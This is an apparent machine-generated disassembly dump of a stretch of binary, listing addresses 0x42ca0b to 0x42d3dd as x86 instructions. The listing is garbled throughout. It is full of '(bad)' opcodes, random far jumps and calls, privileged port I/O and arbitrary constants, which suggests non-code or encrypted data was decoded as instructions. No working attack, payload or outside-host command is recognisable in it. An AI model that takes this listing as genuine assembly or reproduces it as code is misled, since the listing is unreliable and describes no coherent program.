  42ca0b:	xchg   esp,eax
  42ca0c:	aad    0x63
  42ca0e:	out    dx,eax
  42ca0f:	mov    bl,0x56
  42ca11:	pop    edx
  42ca12:	xor    ebx,DWORD PTR [ecx]
  42ca14:	in     al,0x2f
  42ca16:	sub    ch,BYTE PTR [ebp+0x2e]
  42ca19:	cmp    al,bl
  42ca1b:	ds ins BYTE PTR es:[edi],dx
  42ca1d:	or     edi,0xee0002d9
  42ca23:	cdq    
  42ca24:	xchg   ecx,eax
  42ca25:	mov    eax,ds:0x63922ccf
  42ca2a:	mov    eax,ds:0xae13854e
  42ca2f:	xor    al,dl
  42ca31:	daa    
  42ca32:	xchg   ecx,eax
  42ca33:	lds    esi,FWORD PTR [ebp+0x0]
	...
  42ca95:	add    BYTE PTR [edi-0x2be7726],ah
  42ca9b:	push   ebx
  42ca9c:	out    dx,eax
  42ca9d:	(bad)  
  42ca9e:	jb     0x42cab7
  42caa0:	shr    DWORD PTR ds:0x75eb1e02,1
  42caa6:	and    eax,0x70001de
  42caab:	add    DWORD PTR [eax],eax
  42caad:	add    al,ah
  42caaf:	xchg   ebp,eax
  42cab0:	adc    BYTE PTR [edi-0x69c463f4],al
  42cab6:	jmp    0x42cad6
  42cab8:	fwait
  42cab9:	das    
  42caba:	into   
  42cabb:	mov    ecx,0x74cebfbb
  42cac0:	mov    ch,BYTE PTR [ebx+0x3079c028]
  42cac6:	test   BYTE PTR [ecx],al
  42cac8:	(bad)  
  42cac9:	push   eax
  42caca:	cmc    
  42cacb:	xor    eax,0xb87361a1
  42cad0:	and    DWORD PTR ds:0x94d3143,0xffffff83
  42cad7:	jno    0x42ca93
  42cad9:	(bad)  
  42cada:	cmp    eax,0x7fa4323b
  42cadf:	ss add al,0x4a
  42cae2:	mov    gs,WORD PTR [ebp+0x65c0718e]
  42cae8:	mov    cs,WORD PTR [eax+0x6c6841ad]
  42caee:	mov    ebx,0x2188f97e
  42caf3:	cdq    
  42caf4:	mov    bh,0x28
  42caf6:	cmp    ebp,DWORD PTR [esi+0x8429076]
  42cafc:	outs   dx,DWORD PTR ds:[esi]
  42cafd:	pop    esp
  42cafe:	fs xchg ebx,edx
  42cb01:	clc    
  42cb02:	sbb    edi,DWORD PTR [ebx-0x3d]
  42cb05:	sbb    eax,DWORD PTR [ebx-0x37927d55]
  42cb0b:	outs   dx,DWORD PTR ds:[esi]
  42cb0c:	ins    BYTE PTR es:[edi],dx
  42cb0d:	xchg   esp,eax
  42cb0e:	fdivr  DWORD PTR [edx]
  42cb10:	mov    cl,0x7b
  42cb12:	sbb    BYTE PTR ds:0xc4188f37,cl
  42cb18:	enter  0xda69,0x96
  42cb1c:	or     DWORD PTR [ebp+0x6058e018],0xffffff8c
  42cb23:	mul    DWORD PTR [esi]
  42cb25:	mov    esi,0xff34b221
  42cb2a:	adc    esi,ebp
  42cb2c:	ins    DWORD PTR es:[edi],dx
  42cb2d:	std    
  42cb2e:	and    DWORD PTR [ecx-0x16],ebp
  42cb31:	pushf  
  42cb32:	in     al,dx
  42cb33:	shl    ebx,1
  42cb35:	je     0x42cafa
  42cb37:	pop    edx
  42cb38:	lods   al,BYTE PTR ds:[esi]
  42cb39:	adc    sp,WORD PTR [esi+0x5023a7f4]
  42cb40:	add    eax,eax
  42cb42:	push   ds
  42cb43:	ss bswap ebp
  42cb46:	sub    al,0x10
  42cb48:	jno    0x42cad6
  42cb4a:	dec    ecx
  42cb4b:	adc    DWORD PTR [ecx+0x2a35ff87],esi
  42cb51:	mov    BYTE PTR [ebx-0xd],dh
  42cb54:	not    BYTE PTR [ecx+ebx*4+0x3ffacbd7]
  42cb5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cb5c:	push   esi
  42cb5d:	retf   0x9871
  42cb60:	jl     0x42cbd9
  42cb62:	mov    ecx,0x9b21181e
  42cb67:	frstor [ecx-0x12baf912]
  42cb6d:	and    eax,0x21c1ac0b
  42cb72:	repz jle 0x42cb6f
  42cb75:	pop    ss
  42cb76:	cs enter 0x9f31,0x7e
  42cb7b:	mov    esi,0x7758c799
  42cb80:	inc    esi
  42cb81:	popa   
  42cb82:	sub    BYTE PTR [esi-0x51],cl
  42cb85:	mov    ebp,0x979f9550
  42cb8a:	jbe    0x42cb21
  42cb8c:	and    esp,ebp
  42cb8e:	lods   eax,DWORD PTR ss:[si]
  42cb91:	idiv   BYTE PTR [eax]
  42cb93:	clc    
  42cb94:	test   eax,0xfec8dc38
  42cb99:	popf   
  42cb9a:	adc    BYTE PTR [eax-0x18],0x39
  42cb9e:	jmp    0x2e98:0xdac35baa
  42cba5:	adc    ecx,esi
  42cba7:	mov    ch,0xc0
  42cba9:	dec    eax
  42cbaa:	jg     0x42cbe5
  42cbac:	cli    
  42cbad:	xor    dl,0x6f
  42cbb0:	jae    0x42cb55
  42cbb2:	cwde   
  42cbb3:	dec    esp
	...
  42cc14:	add    BYTE PTR [eax],al
  42cc16:	jg     0x42cc1a
  42cc18:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc1c:	call   FWORD PTR [ebx]
  42cc1e:	iret   
  42cc1f:	mov    dl,0xde
  42cc21:	stc    
  42cc22:	cmc    
  42cc23:	(bad)  
  42cc24:	retf   
  42cc25:	imul   ebp,DWORD PTR [edi+ebx*8],0x1
  42cc29:	add    BYTE PTR [edi],al
  42cc2b:	add    DWORD PTR [eax],eax
  42cc2d:	add    BYTE PTR [ebp-0x2b4b5702],bh
  42cc33:	aas    
  42cc34:	dec    ecx
  42cc35:	inc    esi
  42cc36:	and    esp,DWORD PTR [eax+0x703f5f7a]
  42cc3c:	shl    DWORD PTR [edi+esi*4-0x20220ee3],cl
  42cc43:	mov    WORD PTR [edi],cs
  42cc45:	aad    0x5c
  42cc47:	pop    ecx
  42cc48:	rcr    BYTE PTR [eax+0x22],0x8d
  42cc4c:	test   BYTE PTR es:[edx+0x48],0x54
  42cc51:	into   
  42cc52:	jae    0x42cc47
  42cc54:	pop    esi
  42cc55:	jmp    0x42cc2b
  42cc57:	mov    eax,ds:0xa8119e1a
  42cc5c:	mov    DWORD PTR [eax+eax*4+0x1d],edi
  42cc60:	xor    dh,BYTE PTR [esi]
  42cc62:	inc    ecx
  42cc63:	sub    ebp,DWORD PTR [ecx+edx*2-0x7e]
  42cc67:	fisubr WORD PTR [esp+edi*4]
  42cc6a:	jg     0x42cc2a
  42cc6c:	(bad)  
  42cc6d:	call   FWORD PTR [esi]
  42cc6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cc70:	push   edi
  42cc71:	jae    0x42cc84
  42cc73:	test   al,dl
  42cc75:	mov    ecx,0xc6f88cb5
  42cc7a:	jns    0x42cc48
  42cc7c:	xchg   ecx,eax
  42cc7d:	push   esp
  42cc7e:	dec    ebp
  42cc7f:	push   edi
  42cc80:	sub    DWORD PTR [ebx+0x5b383a4c],ecx
  42cc86:	adc    eax,0xc7bad460
  42cc8b:	lds    esp,FWORD PTR [eax+0x1f]
  42cc8e:	jp     0x42cc2a
  42cc90:	push   ss
  42cc91:	push   ds
  42cc92:	outs   dx,DWORD PTR ds:[esi]
  42cc93:	in     al,0x2a
  42cc95:	lock push edx
  42cc97:	outs   dx,BYTE PTR ds:[esi]
  42cc98:	imul   edx,ebp,0xe5849a48
  42cc9e:	(bad)
  42cca1:	ds push esp
  42cca3:	jp     0x42cce1
  42cca5:	mov    dl,0xb8
  42cca7:	inc    edx
  42cca8:	inc    esp
  42cca9:	cmp    al,0x1f
  42ccab:	dec    ecx
  42ccac:	fs mov ah,0xa2
  42ccaf:	jns    0x42cd2c
  42ccb1:	and    dl,BYTE PTR [ebp+0x31]
  42ccb4:	mov    eax,0x89323c39
  42ccb9:	jbe    0x42cc6b
  42ccbb:	mov    edi,0x579c033a
  42ccc0:	pop    esp
  42ccc1:	fwait
  42ccc2:	or     eax,0x3edca387
  42ccc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ccc8:	call   0xb0561bc4
  42cccd:	xchg   esi,eax
  42ccce:	mul    al
  42ccd0:	js     0x42cd32
  42ccd2:	xor    BYTE PTR [ebx],bh
  42ccd4:	cwde   
  42ccd5:	inc    edi
  42ccd6:	push   ebx
  42ccd7:	or     al,0x4b
  42ccd9:	and    dl,BYTE PTR [ebx]
  42ccdb:	scas   al,BYTE PTR es:[edi]
  42ccdc:	add    BYTE PTR [ecx+0x766d02c2],0xbd
  42cce3:	mov    bh,0x1e
  42cce5:	sub    DWORD PTR [eax-0x2fcb6d9],edx
  42cceb:	aam    0x25
  42cced:	adc    eax,0x9dca37be
  42ccf2:	ror    BYTE PTR ds:0xe0973c03,0x3d
  42ccf9:	clc    
  42ccfa:	jne    0x42cd6d
  42ccfc:	repz xlat BYTE PTR ds:[ebx]
  42ccfe:	pop    ss
  42ccff:	sti    
  42cd00:	(bad)  
  42cd01:	push   0x8ffda5ba
  42cd06:	call   0x1e5606c4
  42cd0b:	stos   DWORD PTR es:[edi],eax
  42cd0c:	mov    bh,0xe9
  42cd0e:	sub    al,BYTE PTR [esi-0x73]
  42cd11:	fiadd  DWORD PTR [ecx-0x521563ca]
  42cd17:	js     0x42ccab
  42cd19:	adc    edi,edx
  42cd1b:	jnp    0x42cd6e
  42cd1d:	popa   
  42cd1e:	or     al,0x6
  42cd20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cd21:	aad    0xca
  42cd23:	inc    ecx
  42cd24:	jge    0x42ccf4
  42cd26:	(bad)  
  42cd28:	adc    ebx,DWORD PTR [ebp-0x5e3fa2b7]
  42cd2e:	inc    ebp
  42cd2f:	popf   
  42cd30:	adc    al,0x38
  42cd32:	mov    al,BYTE PTR [ecx+edx*1+0x0]
	...
  42cd96:	sbb    DWORD PTR [ecx-0x20017802],esp
  42cd9c:	jns    0x42cd5d
  42cd9e:	in     eax,0x80
  42cda0:	(bad)  
  42cda2:	(bad)  
  42cda4:	sbb    DWORD PTR [edi+0x1e033],0x107
  42cdae:	pop    edx
  42cdaf:	mov    DWORD PTR [edx-0x53],esi
  42cdb2:	push   ds
  42cdb3:	cdq    
  42cdb4:	xchg   ebp,eax
  42cdb5:	add    eax,esp
  42cdb7:	test   edx,ecx
  42cdb9:	shr    DWORD PTR [ecx-0x315fcf16],1
  42cdbf:	mov    esp,eax
  42cdc1:	xor    ebx,DWORD PTR [eax+0xc2de6a6]
  42cdc7:	pop    ebx
  42cdc8:	lock nop
  42cdca:	jmp    DWORD PTR [ebp+0xac6e71b]
  42cdd0:	pusha  
  42cdd1:	adc    al,0xee
  42cdd3:	lea    edx,[edx+edi*1-0x107a2913]
  42cdda:	hlt    
  42cddb:	inc    edi
  42cddc:	icebp  
  42cddd:	push   ss
  42cdde:	jae    0x42cdec
  42cde0:	sti    
  42cde1:	cmp    ecx,edx
  42cde3:	dec    ebx
  42cde4:	shl    DWORD PTR [eax],cl
  42cde6:	cs int 0xb5
  42cde9:	jg     0x42ce50
  42cdeb:	ficomp DWORD PTR [ecx+0x385a390f]
  42cdf1:	in     al,dx
  42cdf2:	xor    DWORD PTR [edi+0x7],eax
  42cdf5:	pop    ecx
  42cdf6:	es imul ebx
  42cdf9:	pop    ss
  42cdfa:	stos   DWORD PTR es:[edi],eax
  42cdfb:	adc    BYTE PTR [edx-0x4f143693],bh
  42ce01:	fistp  WORD PTR [ecx]
  42ce03:	call   0xae44:0xa35a0cfc
  42ce0a:	sub    ch,dh
  42ce0c:	and    al,0x21
  42ce0e:	pop    ebx
  42ce0f:	fwait
  42ce10:	mov    ds:0x26defee9,eax
  42ce15:	sub    esi,DWORD PTR [edi-0xa66df7d]
  42ce1b:	int    0x9a
  42ce1d:	aam    0x8
  42ce1f:	or     BYTE PTR [esi+0x60bec0c3],al
  42ce25:	pop    edi
  42ce26:	fcmovne st,st(1)
  42ce28:	adc    al,0xc7
  42ce2a:	jmp    0xba4f:0xcbdf6fcf
  42ce31:	scas   eax,DWORD PTR es:[edi]
  42ce32:	iret   
  42ce33:	cld    
  42ce34:	sub    al,0xda
  42ce36:	pushf  
  42ce37:	stos   BYTE PTR es:[edi],al
  42ce38:	(bad)  
  42ce39:	xlat   BYTE PTR ds:[ebx]
  42ce3a:	or     cl,BYTE PTR [edi]
  42ce3c:	scas   eax,DWORD PTR es:[edi]
  42ce3d:	mov    edi,0xab5203c3
  42ce42:	and    bl,BYTE PTR [edi-0x6142592b]
  42ce48:	mov    dl,0x34
  42ce4a:	daa    
  42ce4b:	xor    DWORD PTR [ebx],0x8cbe91c2
  42ce51:	push   eax
  42ce52:	retf   
  42ce53:	shr    BYTE PTR ds:0x7ae2eaf8,cl
  42ce59:	popa   
  42ce5a:	cmp    eax,0x8a4bb8b9
  42ce5f:	aaa    
  42ce60:	nop
  42ce61:	push   0xffffff84
  42ce63:	fistp  QWORD PTR [edi+0x5d79e779]
  42ce69:	stos   BYTE PTR es:[edi],al
  42ce6a:	call   0xe9bc7dae
  42ce6f:	pop    ecx
  42ce70:	mov    ecx,0x18fa5c53
  42ce75:	xchg   esp,eax
  42ce76:	xor    al,0x82
  42ce78:	push   DWORD PTR [esi+0x37]
  42ce7b:	(bad)  
  42ce7c:	icebp  
  42ce7d:	inc    eax
  42ce7e:	lahf   
  42ce7f:	lods   al,BYTE PTR ds:[esi]
  42ce80:	aad    0xb8
  42ce82:	mov    es,WORD PTR [edx]
  42ce84:	pop    ss
  42ce85:	xchg   BYTE PTR [ecx-0x10],bl
  42ce88:	xor    DWORD PTR [edi-0x677d0210],ecx
  42ce8e:	out    dx,eax
  42ce8f:	or     BYTE PTR [ebx+0x5b],dl
  42ce92:	call   0x8bb734c4
  42ce97:	sub    DWORD PTR [ebp-0x50],0xffffff82
  42ce9b:	ins    BYTE PTR es:[edi],dx
  42ce9c:	sub    BYTE PTR [ebp-0xb773c8d],bl
  42cea2:	mov    BYTE PTR [edi+0x4f068db6],0x73
  42cea9:	push   ebp
  42ceaa:	xchg   edi,eax
  42ceab:	mov    bl,0x99
  42cead:	jb     0x42cecc
  42ceaf:	fs cmp edi,ebx
  42ceb2:	scas   eax,DWORD PTR es:[edi]
  42ceb3:	or     al,BYTE PTR [bx+si]
	...
  42cf16:	jae    0x42cf55
  42cf18:	fadd   st,st(1)
  42cf1a:	fsubrp st(5),st
  42cf1c:	jnp    0x42cedd
  42cf1e:	mov    esi,DWORD PTR [ebx-0x62c7d2ef]
  42cf24:	dec    edi
  42cf25:	sti    
  42cf26:	cmp    ah,cl
  42cf28:	add    DWORD PTR [eax],eax
  42cf2a:	pop    es
  42cf2b:	add    DWORD PTR [eax],eax
  42cf2d:	add    BYTE PTR [ebx],al
  42cf2f:	fmul   DWORD PTR [edx+edx*4-0x2fcb7be6]
  42cf36:	lahf   
  42cf37:	sub    al,0x11
  42cf39:	inc    edx
  42cf3a:	xchg   ecx,eax
  42cf3b:	dec    esi
  42cf3c:	mov    bh,0xbb
  42cf3e:	sbb    al,0x85
  42cf41:	add    BYTE PTR [edi+0x480ef30b],ah
  42cf47:	data16 hlt 
  42cf49:	aaa    
  42cf4a:	(bad)  
  42cf4b:	mov    ch,0xb8
  42cf4d:	int3   
  42cf4e:	inc    ecx
  42cf4f:	rcl    esp,1
  42cf51:	pop    es
  42cf52:	jo     0x42cf47
  42cf54:	push   es
  42cf55:	call   0xc6af:0x5adb157c
  42cf5c:	loope  0x42cf97
  42cf5e:	mov    cl,0xe3
  42cf60:	mov    ds:0x64dc04ea,al
  42cf65:	ins    DWORD PTR es:[edi],dx
  42cf66:	xchg   esp,eax
  42cf67:	mov    dh,0xdb
  42cf69:	repz add BYTE PTR [ecx-0x70],0x37
  42cf6e:	repnz retf 0x393b
  42cf72:	jmp    0x58dcc63e
  42cf77:	pop    ecx
  42cf78:	lea    ebx,[edi+0x54]
  42cf7b:	fs ret 
  42cf7d:	or     DWORD PTR [edi-0x217b4d32],esi
  42cf83:	cs mov ecx,ds
  42cf86:	ret    0x14fa
  42cf89:	aam    0xb0
  42cf8b:	mov    DWORD PTR [esi-0x33],esp
  42cf8e:	push   ebx
  42cf8f:	int    0x2a
  42cf91:	sbb    al,0x11
  42cf93:	inc    ecx
  42cf94:	fisttp DWORD PTR [ecx-0x13]
  42cf97:	in     al,0x97
  42cf99:	mov    eax,0xf441b7d9
  42cf9e:	lahf   
  42cf9f:	and    DWORD PTR [esi],0xf4f6faf9
  42cfa5:	jne    0x42cf2a
  42cfa7:	inc    edx
  42cfa8:	xlat   BYTE PTR ds:[ebx]
  42cfa9:	cld    
  42cfaa:	add    al,0xed
  42cfac:	imul   ecx,DWORD PTR [edx-0x70],0xea7bc66a
  42cfb3:	cs xchg edx,eax
  42cfb5:	fucomp st(5)
  42cfb7:	mov    al,ds:0x8db4c2d1
  42cfbc:	jnp    0x42cfb7
  42cfbe:	fimul  DWORD PTR [ebp+0x75]
  42cfc1:	std    
  42cfc2:	cdq    
  42cfc3:	fs mov ebx,0x5ae4fecb
  42cfc9:	jae    0x42d020
  42cfcb:	jp     0x42d01e
  42cfcd:	sar    DWORD PTR [esi+ebx*1-0x6d],1
  42cfd1:	jge    0x42cfbb
  42cfd3:	mov    dl,cl
  42cfd5:	and    al,0x3a
  42cfd7:	jl     0x42cfa2
  42cfd9:	cdq    
  42cfda:	sbb    al,0x3d
  42cfdc:	ror    DWORD PTR [edi-0x2e],1
  42cfdf:	xor    eax,0xdabde5eb
  42cfe5:	dec    edx
  42cfe6:	pop    ebx
  42cfe7:	gs pop esi
  42cfe9:	mov    ?,WORD PTR [ebx-0x6]
  42cfec:	or     al,0x72
  42cfee:	xchg   edi,eax
  42cfef:	ret    0x9b13
  42cff2:	dec    edx
  42cff3:	push   eax
  42cff4:	cs push ss
  42cff6:	pop    ebp
  42cff7:	lds    esi,FWORD PTR [esi]
  42cff9:	stos   BYTE PTR es:[edi],al
  42cffa:	mov    ds,WORD PTR ss:[ecx]
  42cffd:	xchg   esp,eax
  42cffe:	(bad)  
  42cfff:	fwait
  42d000:	mov    esp,0xe8b95e96
  42d005:	or     esi,ecx
  42d007:	popa   
  42d008:	popa   
  42d009:	push   edx
  42d00a:	or     eax,0xf546c7b4
  42d00f:	fbstp  TBYTE PTR [ebp-0x1ca05f76]
  42d015:	pop    ecx
  42d016:	and    cl,al
  42d018:	inc    ecx
  42d019:	repz retfw 
  42d01c:	and    al,0xf7
  42d01e:	push   ds
  42d01f:	xor    bh,BYTE PTR [ecx-0x27]
  42d022:	mov    bl,0x23
  42d024:	push   cs
  42d025:	mov    ebp,cs
  42d027:	je     0x42d004
  42d029:	fwait
  42d02a:	ins    BYTE PTR es:[edi],dx
  42d02b:	xchg   ebp,eax
  42d02c:	or     BYTE PTR [edi-0x2],dh
  42d02f:	sub    al,0xae
  42d032:	pmaxsw mm6,mm2
	...
  42d095:	add    BYTE PTR [eax+0x3a],dl
  42d098:	(bad)  
  42d099:	sub    al,0xee
  42d09b:	cld    
  42d09c:	cli    
  42d09d:	jle    0x42d0ad
  42d09f:	fmul   DWORD PTR [ebp-0xa]
  42d0a2:	jns    0x42d0aa
  42d0a4:	cld    
  42d0a5:	imul   eax,DWORD PTR [ecx-0x1e],0x1
  42d0a9:	add    BYTE PTR [edi],al
  42d0ab:	add    DWORD PTR [eax],eax
  42d0ad:	add    dh,ah
  42d0af:	sub    al,0x82
  42d0b1:	in     al,dx
  42d0b2:	pop    esp
  42d0b3:	sub    al,0x8b
  42d0b5:	sbb    DWORD PTR [ecx-0x66a409c8],0xa9e020ab
  42d0bf:	cs push 0xffffffb1
  42d0c2:	mov    WORD PTR [ebp-0x8],ss
  42d0c5:	ja     0x42d117
  42d0c7:	lea    ecx,[ebp+0x3a]
  42d0ca:	icebp  
  42d0cb:	dec    eax
  42d0cc:	js     0x42d0b8
  42d0ce:	sbb    ebx,ebp
  42d0d0:	aad    0x23
  42d0d2:	ss xchg ebp,eax
  42d0d4:	(bad)  
  42d0d5:	loopne 0x42d0cc
  42d0d7:	scas   eax,DWORD PTR es:[edi]
  42d0d8:	mov    esi,0xbe3f1aa1
  42d0dd:	xchg   ecx,eax
  42d0de:	cld    
  42d0df:	lods   al,BYTE PTR ds:[esi]
  42d0e0:	leave  
  42d0e1:	mov    al,0xc0
  42d0e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d0e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d0e5:	push   ebx
  42d0e6:	push   esp
  42d0e7:	out    0xd4,al
  42d0e9:	shl    DWORD PTR [eax+0x1d460c87],0xb7
  42d0f0:	push   es
  42d0f1:	pop    ebx
  42d0f2:	adc    ch,BYTE PTR [edi-0x5a]
  42d0f5:	daa    
  42d0f6:	mov    ebx,0xea82868d
  42d0fb:	adc    eax,0x5e7a233b
  42d100:	cdq    
  42d101:	js     0x42d093
  42d103:	pop    ds
  42d104:	lods   al,BYTE PTR ds:[esi]
  42d105:	xchg   DWORD PTR [edi-0x6b],edi
  42d108:	imul   ebx,DWORD PTR [esp+ecx*2-0x5d46ef23],0x69149239
  42d113:	ror    DWORD PTR [ebp+edi*8+0x2d],1
  42d117:	jecxz  0x42d100
  42d119:	mov    dl,0x7e
  42d11b:	sbb    BYTE PTR [esi+0x38],ch
  42d11e:	pop    ecx
  42d11f:	popa   
  42d120:	ret    
  42d121:	mov    ds:0x650e2058,al
  42d126:	adc    esp,DWORD PTR [edx+0x66]
  42d129:	lea    esp,[eax-0x63]
  42d12c:	push   edi
  42d12d:	jb     0x42d0ea
  42d12f:	inc    ebp
  42d130:	sub    esp,edi
  42d132:	daa    
  42d133:	inc    esp
  42d134:	mov    ecx,0xca4f3372
  42d139:	(bad)  
  42d13a:	push   cs
  42d13b:	dec    ecx
  42d13c:	pushf  
  42d13d:	(bad)  
  42d13f:	lods   al,BYTE PTR ds:[esi]
  42d140:	fcmovne st,st(6)
  42d142:	inc    eax
  42d143:	ins    DWORD PTR es:[edi],dx
  42d144:	pop    esp
  42d145:	add    DWORD PTR [edi+ebx*4+0xa],edi
  42d149:	clc    
  42d14a:	mov    eax,ebx
  42d14c:	cli    
  42d14d:	sub    ebp,DWORD PTR [edi+0x63]
  42d150:	icebp  
  42d151:	xchg   DWORD PTR [ecx+eax*2],ebx
  42d154:	dec    edx
  42d155:	icebp  
  42d156:	push   edx
  42d157:	xor    bl,BYTE PTR [edx+edi*4]
  42d15a:	sub    edx,DWORD PTR [edi+0x6b3affa3]
  42d160:	pop    edx
  42d161:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d162:	(bad)  
  42d163:	fimul  WORD PTR [edi-0x3c47fccb]
  42d169:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d16a:	cmp    DWORD PTR [ecx],esp
  42d16c:	hlt    
  42d16d:	mov    al,0xab
  42d16f:	ins    BYTE PTR es:[edi],dx
  42d170:	aam    0xdd
  42d172:	shl    DWORD PTR [edx+0xd],cl
  42d175:	sub    DWORD PTR [edx+0xb],ecx
  42d178:	add    ecx,DWORD PTR [ebx+0x20]
  42d17b:	sub    BYTE PTR [eax],ah
  42d17d:	add    eax,0x36255b95
  42d182:	sbb    dh,bh
  42d184:	xchg   esp,eax
  42d185:	fwait
  42d186:	dec    edi
  42d187:	ins    BYTE PTR es:[edi],dx
  42d188:	lds    eax,FWORD PTR [ecx-0x3f]
  42d18b:	push   gs
  42d18d:	mov    dl,BYTE PTR [edi+0x70]
  42d190:	xchg   ebx,eax
  42d191:	out    dx,al
  42d192:	xchg   ebx,eax
  42d193:	xchg   BYTE PTR [edx],dh
  42d195:	loope  0x42d1f5
  42d197:	push   ebp
  42d198:	ds lds esi,FWORD PTR es:[ebx-0x741b160d]
  42d1a0:	ficomp DWORD PTR [edx]
  42d1a2:	data16 mov ds:0xf456d2cd,al
  42d1a8:	es call 0xc776:0x3b465199
  42d1b0:	xor    al,0x78
  42d1b2:	fisubr DWORD PTR [ecx-0x7f]
	...
  42d215:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d21b:	ja     0x42d1cc
  42d21d:	sti    
  42d21e:	ret    
  42d21f:	or     ebx,esp
  42d221:	pop    ds
  42d222:	mov    dh,BYTE PTR [edi]
  42d224:	pop    eax
  42d225:	sub    DWORD PTR [eax-0x1d],ecx
  42d228:	add    DWORD PTR [eax],eax
  42d22a:	pop    es
  42d22b:	add    DWORD PTR [eax],eax
  42d22d:	add    bl,dh
  42d22f:	int    0x8a
  42d231:	push   edi
  42d232:	repz rol BYTE PTR [ebx-0x6a02641d],1
  42d239:	in     eax,dx
  42d23a:	dec    eax
  42d23b:	arpl   cx,si
  42d23d:	cwde   
  42d23e:	lea    edi,[edi+0x35]
  42d241:	jmp    0x42d22c
  42d243:	hlt    
  42d244:	js     0x42d2b8
  42d246:	call   0x841f6a18
  42d24b:	cmp    DWORD PTR [eax],edx
  42d24d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d24e:	nop
  42d24f:	dec    ecx
  42d250:	shl    BYTE PTR [ebp+0x77b50c7c],cl
  42d256:	rol    BYTE PTR [ecx],0x3f
  42d259:	pop    ecx
  42d25a:	test   BYTE PTR [edi],bl
  42d25c:	push   0x47
  42d25e:	aam    0x49
  42d260:	xlat   BYTE PTR ds:[ebx]
  42d261:	or     eax,0x9e1fd291
  42d266:	in     al,dx
  42d267:	mov    al,ds:0x6d16df82
  42d26c:	sbb    dh,bl
  42d26e:	cld    
  42d26f:	std    
  42d270:	push   esp
  42d271:	xor    ch,BYTE PTR [ebx]
  42d273:	inc    ecx
  42d274:	fs jecxz 0x42d221
  42d277:	test   eax,0x13d1a23f
  42d27c:	enter  0x341c,0x84
  42d280:	sbb    DWORD PTR [eax+0x402636f],esi
  42d286:	shl    DWORD PTR [ebx+0x697dc7a0],0xa9
  42d28d:	mov    edx,0x2414ea1c
  42d292:	les    esi,FWORD PTR [edi]
  42d294:	push   edx
  42d295:	mov    al,ds:0xb10989ba
  42d29a:	sbb    dh,bh
  42d29c:	outs   dx,BYTE PTR ds:[esi]
  42d29d:	push   cs
  42d29e:	pop    ds
  42d29f:	je     0x42d2c3
  42d2a1:	mov    edi,0x1f987717
  42d2a6:	dec    ecx
  42d2a7:	mov    ds:0xb34c5318,eax
  42d2ac:	dec    ecx
  42d2ad:	mov    ch,0x5a
  42d2af:	inc    esi
  42d2b0:	pop    edx
  42d2b1:	push   ds
  42d2b2:	push   ebx
  42d2b3:	inc    ebx
  42d2b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d2b5:	pop    es
  42d2b6:	cld    
  42d2b7:	mov    ecx,0xd554ba46
  42d2bc:	xchg   dl,al
  42d2be:	fdivr  st(7),st
  42d2c0:	cmp    dh,BYTE PTR [ecx+0x30]
  42d2c3:	xor    eax,0x8262ade4
  42d2c8:	pop    es
  42d2c9:	aas    
  42d2ca:	lods   al,BYTE PTR ds:[esi]
  42d2cb:	and    eax,0x17e1fafe
  42d2d0:	dec    ebp
  42d2d1:	pop    eax
  42d2d2:	test   DWORD PTR [edi-0x460c609c],0x4f9dba5a
  42d2dc:	push   eax
  42d2dd:	es enter 0xfb31,0xa4
  42d2e2:	adc    ch,dh
  42d2e4:	in     eax,0x31
  42d2e6:	and    cl,BYTE PTR [esp+edi*2+0x57]
  42d2ea:	inc    edi
  42d2eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d2ec:	cli    
  42d2ed:	aaa    
  42d2ee:	xchg   ebp,eax
  42d2ef:	aas    
  42d2f0:	sub    BYTE PTR [ecx-0x7a381c5c],dh
  42d2f6:	mov    bh,0xf1
  42d2f8:	xchg   edx,eax
  42d2f9:	cmp    ebp,DWORD PTR ds:0x67216529
  42d2ff:	outs   dx,BYTE PTR ds:[esi]
  42d300:	iret   
  42d301:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d302:	push   eax
  42d303:	mov    bl,0xd
  42d305:	inc    edx
  42d306:	dec    esi
  42d307:	lock pop esp
  42d309:	dec    esp
  42d30a:	fstp   TBYTE PTR [edi-0x352b4fe9]
  42d310:	dec    esi
  42d311:	jno    0x42d2f1
  42d313:	repz fild WORD PTR [eax]
  42d316:	shl    BYTE PTR [ecx-0x4b],0xa
  42d31a:	xor    eax,0xcfa1fed2
  42d31f:	fist   DWORD PTR [ebx+eiz*8+0x547bd326]
  42d326:	xor    DWORD PTR [esp+esi*1+0xbd81f67],0x6aa73dfb
  42d331:	xchg   BYTE PTR [esi-0x59],ah
  42d334:	pop    ecx
	...
  42d395:	add    cl,al
  42d397:	into   
  42d398:	arpl   WORD PTR [ecx-0x21044291],bx
  42d39e:	cmp    BYTE PTR [esp+ecx*8-0x60b110a8],bl
  42d3a5:	mov    ecx,0x1e44f
  42d3aa:	pop    es
  42d3ab:	add    DWORD PTR [eax],eax
  42d3ad:	add    bh,ah
  42d3af:	das    
  42d3b0:	(bad)  
  42d3b1:	pusha  
  42d3b2:	(bad)  
  42d3b3:	out    0x49,al
  42d3b5:	(bad)  
  42d3b6:	jmp    0xe7c0:0xd6b65b7e
  42d3bd:	ins    BYTE PTR es:[edi],dx
  42d3be:	popf   
  42d3bf:	push   edi
  42d3c0:	std    
  42d3c1:	mov    dl,0x0
  42d3c3:	sbb    BYTE PTR [esi+esi*4+0x18fe99d4],dl
  42d3ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d3cb:	popf   
  42d3cc:	jle    0x42d381
  42d3ce:	jmp    0x42d35e
  42d3d0:	cmc    
  42d3d1:	add    ah,BYTE PTR [eax+edi*2]
  42d3d4:	int3   
  42d3d5:	shr    DWORD PTR [esi+0x68a1c93e],cl
  42d3db:	push   edi
  42d3dc:	pop    edi
  42d3dd:	mov    al,ds:0xc23aee6b
